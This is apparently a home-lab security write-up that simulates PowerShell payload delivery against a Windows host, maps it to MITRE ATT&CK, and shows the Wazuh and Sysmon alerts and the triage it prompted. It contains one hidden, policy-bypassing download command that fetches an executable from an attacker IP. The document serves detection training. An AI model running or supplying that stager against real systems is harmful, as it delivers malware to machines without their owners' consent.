
## Scenario 1: Malicious PowerShell Execution & Payload Delivery

### 🎯 Objective
Simulate a fileless malware staging attack where an adversary attempts to download a malicious payload from an external server using PowerShell, bypassing local execution policies, and dropping an executable into a system folder.

### 🗺️ MITRE ATT&CK Mapping
* **Tactic:** Execution (`TA0002`)
* **Technique:** Command and Scripting Interpreter: PowerShell (`T1059.001`)

### 💥 Attack Execution (Kali Linux -> Windows Target)
The following stager was executed on the Windows target to simulate pulling a reverse shell payload from the attacker's infrastructure:
\`\`\`powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri http://10.10.10.40/payload.exe -OutFile C:\Windows\Temp\payload.exe"
\`\`\`

### 🛡️ Detection & Telemetry
The Windows endpoint, enriched with **Sysmon (SwiftOnSecurity config)**, successfully captured the payload delivery and forwarded the telemetry to the Wazuh SIEM. 

The SIEM successfully correlated the malicious process creation with a dangerous file drop, triggering the following alerts:
* **Rule ID 92213 (Severity 15):** Executable file dropped in folder commonly used by malware.
* **Rule ID 92027 (Severity 4):** Powershell process spawned powershell instance.

**Key IOC:** By analyzing the raw JSON telemetry for Rule `92027`, the exact command string executed by the attacker was extracted from Sysmon Event ID 1 (`data.win.eventdata.commandLine`), revealing the attacker's hosting IP (`10.10.10.40`) and the dropped payload location (`C:\Windows\Temp\payload.exe`).

<img width="639" height="403" alt="image" src="https://github.com/user-attachments/assets/3be785e7-7511-4eeb-8f53-3839abc261de" />


<img width="316" height="296" alt="image" src="https://github.com/user-attachments/assets/10f26049-73ae-474e-89f4-e3546e49981b" />


### 🛠️ Analyst Triage & Incident Response
During a live investigation, discovering an unknown executable dropped in `C:\Windows\Temp` requires immediate triage. The host should be logically isolated from the corporate network. Analysts would then pivot to the raw Sysmon Event ID 1 logs to extract the exact PowerShell command used to download the file, revealing the attacker's infrastructure (`10.10.10.40`) so it can be blocked globally.
